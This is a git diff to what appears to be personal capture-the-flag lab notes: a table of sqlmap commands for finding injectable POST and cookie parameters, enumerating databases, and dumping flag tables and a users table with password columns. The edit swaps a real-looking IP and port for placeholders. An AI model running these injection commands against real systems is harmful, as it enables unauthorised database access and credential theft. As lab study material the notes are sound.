@@ -226,15 +226,15 @@ python sqlmap.py
 ```
 | Command | Description |
 |--------|------------|
-| `sqlmap -u "http://target:port/test.php" --data="id=1"` | Identify Injectable POST (id) | 
-| `sqlmap -u "http://target:port/test.php" --data="id=1" --dbs` | Look for available DB. (Info_schema is normal) |
-| `sqlmap -u "http://target:port/test.php" --data="id=1" -D testdb --tables` | Found DB (testdb) and use --tables to look for whats inside it |
-| `sqlmap -u "http://target:port/test.php" --data="id=1" -D testdb -T flag2 --dump` | Saw Flag2 as a table and --dump contents |
-| `sqlmap -u "http://target:port/test.php" --cookie="id=1" -p id --level=5 --risk=3` | Force SQLi Testing on Injectable Cookie Value (id) |
-| `sqlmap -u "http://target:port/test.php" --cookie="id=1" -D testdb -T flag3 --dump` | Repeat same process as ABOVE example ^ |
+| `sqlmap -u "http://target:PORT/test.php" --data="id=1"` | Identify Injectable POST (id) | 
+| `sqlmap -u "http://target:PORT/test.php" --data="id=1" --dbs` | Look for available DB. (Info_schema is normal) |
+| `sqlmap -u "http://target:PORT/test.php" --data="id=1" -D testdb --tables` | Found DB (testdb) and use --tables to look for whats inside it |
+| `sqlmap -u "http://target:PORT/test.php" --data="id=1" -D testdb -T flag2 --dump` | Saw Flag2 as a table and --dump contents |
+| `sqlmap -u "http://target:PORT/test.php" --cookie="id=1" -p id --level=5 --risk=3` | Force SQLi Testing on Injectable Cookie Value (id) |
+| `sqlmap -u "http://target:PORT/test.php" --cookie="id=1" -D testdb -T flag3 --dump` | Repeat same process as ABOVE example ^ |
 | `POST /test.php {"id":1}` | With JSON, use BurpSuite -> Proxy -> Send to Repeater -> Copy to file -> Cat the file in bash |
 | `sqlmap -r test.txt -pd id --dbs --batch` | Same process, find DB -> find tables inside DB -> dump flag |
-| `sqlmap -u "http://target:port/test.php?id=1" -D testdb -T flag5 --dump --no-cast --fresh-queries` | Fresh Queries ensured clean binary data. |
-| `sqlmap -u "http://target:port/test.php?col=id" --prefix='(look up prefixes)' --level=5 --risk=3 -D testdb -T flag6 --dump --no-cast` | Use Prefix with column usage to escape wrapped context. |
-| `sqlmap -u "http://TARGET/case7.php?id=1" --union-cols=5 --no-cast -D testdb -T flag7 --dump` | Specify # of collumns for UNION SQLi. |
-| `sqlmap -u "http://94.237.61.202:39488/case1.php?id=1" -D testdb -T users -C id,name,password --dump |
+| `sqlmap -u "http://target:PORT/test.php?id=1" -D testdb -T flag5 --dump --no-cast --fresh-queries` | Fresh Queries ensured clean binary data. |
+| `sqlmap -u "http://target:PORT/test.php?col=id" --prefix='(look up prefixes)' --level=5 --risk=3 -D testdb -T flag6 --dump --no-cast` | Use Prefix with column usage to escape wrapped context. |
+| `sqlmap -u "http://target:PORT/case7.php?id=1" --union-cols=5 --no-cast -D testdb -T flag7 --dump` | Specify # of collumns for UNION SQLi. |
+| `sqlmap -u "http://target:PORT/case1.php?id=1" -D testdb -T users -C id,name,password --dump | Grab User Table/Crack Passwords (Use Wordlist and Select No for Slow Option)
